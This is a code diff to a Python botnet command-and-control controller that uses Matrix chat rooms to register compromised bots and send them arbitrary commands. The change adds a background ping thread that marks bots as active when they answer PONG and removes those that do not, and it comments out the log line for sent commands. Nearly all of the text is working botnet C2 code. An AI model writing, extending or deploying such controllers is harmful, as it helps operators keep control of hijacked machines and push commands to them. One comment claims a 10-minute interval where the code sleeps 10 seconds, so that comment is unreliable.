@@ -1,4 +1,6 @@
 import random
+import threading
+import time
 from typing import Self
 import uuid
 from matrix_client.client import MatrixClient, Room
@@ -37,7 +39,7 @@ class Bot:
 
 
 class CommandRoom:
-    bots: dict[str, Bot]
+    bots: dict[str, list[Bot, bool]]
     room: Room
     
     def __init__(self, room):
@@ -49,12 +51,24 @@ class CommandRoom:
     
     def add_bot(self, bot_data) -> Bot:
         bot: Bot = Bot(bot_data)
-        self.bots[bot.bot_id] = bot
+        self.bots[bot.bot_id] = [bot, True]
         return bot
-    
+
     def remove_bot(self, bot_id):
         del self.bots[bot_id]
+        
+    def set_active(self, bot_id):
+        self.bots[bot_id][1] = True
     
+    def set_all_inactive(self):
+        for bot in self.bots.values():
+            bot[1] = False
+    
+    def delete_inactive_bots(self):
+        # SCUFFED BECAUSE GIL
+        self.bots = {k: bot for k, bot in self.bots.items() if bot[1] == True}
+
+
     def send_cmd(self, cmd):
         return self.room.send_text(cmd)
         
@@ -64,8 +78,10 @@ class BotnetController:
     announce_room: Room
     command_rooms: dict[str, CommandRoom]
     
+    
     def __init__(self):
         self.device_id = "BOTCONTROLLER"
+        self.pinging = False
         self.client = MatrixClient(MATRIX_HOMESERVER)
         self.command_rooms = {}
 
@@ -105,7 +121,7 @@ class BotnetController:
     def send_command(self, command, room):
         response = room.send_cmd(f"COMMAND:{command}")
         # TODO: check for successfull response?
-        print(f"[+] Sent command: {command}")
+        # print(f"[+] Sent command: {command}")
         
     def send_to_all(self, command):
         for id, cmd_room in self.command_rooms.items():
@@ -117,7 +133,7 @@ class BotnetController:
     def on_message(self, room, event):
         msgbody: str = event["content"]["body"]
         action, info = msgbody.split(":", 1)
-        if action == "CONNECT":
+        if action == "CONNECT" and not self.pinging:
             msgbody = msgbody.removeprefix("CONNECT:")
             msgbody = json.loads(msgbody)
             botid = msgbody["bot_id"]
@@ -128,9 +144,13 @@ class BotnetController:
                 f"RESOLVE {botid}:{room_id}"
             )
             self.assign_bot(msgbody, room_id)
-        elif action == "DISCONNECT":
+        elif action == "DISCONNECT" and not self.pinging:
             room_id, bot_id = info.rsplit(":", 1)
             self.command_rooms[room_id].remove_bot(bot_id)
+        elif action == "PONG":
+            room_id, bot_id = info.rsplit(":", 1)
+            self.command_rooms[room_id].set_active(bot_id)
+            
 
             
     def create_room(self, name: str) -> Room:
@@ -142,6 +162,22 @@ class BotnetController:
         new_room = self.create_room(f"cmd_{name}")
         self.command_rooms[new_room.room_id] = CommandRoom(new_room)
 
+    def ping_loop(self):
+        while True:
+            time.sleep(10) # every 10 minutes
+            self.pinging = True
+            # Mark
+            for room in self.command_rooms.values():
+                room.set_all_inactive()
+            self.send_to_all("PING")
+            time.sleep(5) # wait a bit
+            # Sweep
+            for room in self.command_rooms.values():
+                room.delete_inactive_bots()
+            self.pinging = False
+
+
+    # --------------- options ------------------
     def command_option(self):
         command = input("Command: ")
         all_rooms = input("Would you like to send command to all rooms [Y/n]? ").lower()
@@ -182,7 +218,8 @@ class BotnetController:
         
         self.announce_room.add_listener(self.on_message)
         self.client.start_listener_thread()
-        
+        threading.Thread(name="PING THREAD", target=self.ping_loop, daemon=True).start()
+
         
         print("[+] Controller ready. Enter commands to send to bots.")
         while True:
